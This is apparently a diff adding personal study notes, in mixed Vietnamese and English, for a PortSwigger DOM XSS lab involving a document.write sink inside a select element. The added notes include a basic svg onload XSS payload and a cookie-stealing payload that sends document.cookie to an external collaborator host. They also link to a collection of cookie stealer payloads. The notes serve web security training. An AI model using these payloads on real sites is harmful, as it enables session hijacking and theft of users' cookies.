@@ -240,6 +240,25 @@ hoặc [ở đây](https://portswigger.net/web-security/cross-site-scripting/che
 
 
 - [ ] **22/4** — DOM XSS in document.write sink using source location.search inside a select element
+
+![alt text](image-18.png)
+The problem is sink kết hợp với source từ đó -> DOM XSS 
+
+![alt text](image-19.png)
+WE can using invader dom to test xss
+
+![alt text](image-20.png)
+And to escapse we using `">` ; and payload is : 
+```code
+"><svg onload=alert(1)>
+```
+And using the below to steal cookie 
+```code
+"></select><script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script>//
+```
+[Cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md)
+
+
 - [ ] **23/4** — DOM XSS using web messages and JSON.parse
 - [ ] **24/4** — DOM XSS using web messages and a JavaScript URL
 - [ ] **25/4** — DOM XSS using web messages
